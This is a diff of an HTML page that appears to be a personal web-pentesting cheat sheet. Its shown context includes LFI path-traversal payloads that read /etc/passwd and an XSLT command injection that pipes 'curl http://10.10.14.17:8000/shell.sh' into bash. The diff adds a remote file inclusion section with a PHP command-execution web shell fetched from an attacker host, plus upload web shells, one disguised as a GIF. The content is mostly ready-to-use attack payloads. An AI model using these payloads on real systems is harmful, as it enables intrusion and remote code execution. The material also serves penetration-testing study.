@@ -53,7 +53,7 @@
                 <h2>Exploitation</h2>
                 <ul>
                 </div>
-                        <h2 id="Local File Inclusion">LFI: Local File Inclusion</h2>
+                        <h2 id="LFI: Local File Inclusion">LFI: Local File Inclusion</h2>
                         <ul>
                             <h3>Basic path traversal payloads</h3><pre><code class="language-url">http://.../index.php?language=../../../../etc/passwd
 http://.../index.php?language=/../../../../etc/passwd
@@ -65,6 +65,16 @@ http://...index.php?language=/etc/passwd%00.php</code></pre>
                             <h3>Local File Inclusion using UNICODE chars</h3>
                             <p>Normally there are sanitizations that prevent for LFI but in some cases you could be able to bypass them by using UNICODE chars take a look at <a class="notion-link" href="https://book.hacktricks.wiki/en/pentesting-web/unicode-injection/unicode-normalization.html"> Hacktricks</a></p>
                             <pre><code class="language-bash">%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/passwd</code></pre>    
+                        </ul>
+
+                        <h2 id="RFI: Remote File Inclusion">RFI: Remote File Inclusion</h2>
+                        <ul>
+                            <p>Normally if you found an LFI you also be able to exploit an RFI</p>
+                            <p>Create a simple php script to execute commands</p>
+                            <pre><code class="language-bash">echo '&lt;?php system($_GET["cmd"]); ?&gt;' > shell.php</code></pre>
+                            <p>Host the previous file and perform a request to your server to execute the command</p>
+                            <p>It is important to serve the parameter using & since if not it will fail. The reason it is beacause you can't nest multiple parameters</p>
+                            http://192.168.1.2:8080/index.php?language=http://10.10.11.14:5555/shell.php&cmd=id
                         </ul>
 
                         <h2 id="SQL injection">SQL injection</h2>
@@ -263,8 +273,6 @@ USER)(description=a* #Check if the first letter of description field starts with
 &lt;/html&gt;
                             </code></pre>
 
-                            
-
                             <p>Command injection</p>
                             <pre><code class="language-XML">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;xsl:stylesheet
@@ -284,16 +292,16 @@ os.system("curl http://10.10.14.17:8000/shell.sh | bash")
 ]]&gt;&lt;/xsl:text&gt;
     &lt;/exslt:document&gt;
   &lt;/xsl:template&gt;
-&lt;/xsl:stylesheet&gt;
-                            </code></pre>
-
+&lt;/xsl:stylesheet&gt;</code></pre>
+</ul>
                             <h2 id = "File Upload" >File Upload</h2>
-                            <p>In case you found a method of file upload which can be exploited. (Normally by know where are located the uploaded files and which is it's name)</p>
-                            <pre><code class="language-php">&lt;?php echo "&lt;pre&gt;" . shell_exec($_GET["cmd"]) . "&lt;/pre&gt;"?&gt;</code></pre>
-
-                            
-
-
+                            <ul>
+                                <p>In case you found a method of file upload which can be exploited. (Normally by know where are located the uploaded files and which is it's name)</p>
+                                <pre><code class="language-php">&lt;?php echo "&lt;pre&gt;" . shell_exec($_GET["cmd"]) . "&lt;/pre&gt;"?&gt;</code></pre>
+                                <p>Creation of a malicious GIF file</p>
+                                <pre><code class="language-php">echo 'GIF8&lt;?php system($_GET["cmd"]); ?&gt;' > shell.gif</code></pre>
+                                
+                            </ul>    
                         </ul>
                     </div>
                 </ul>
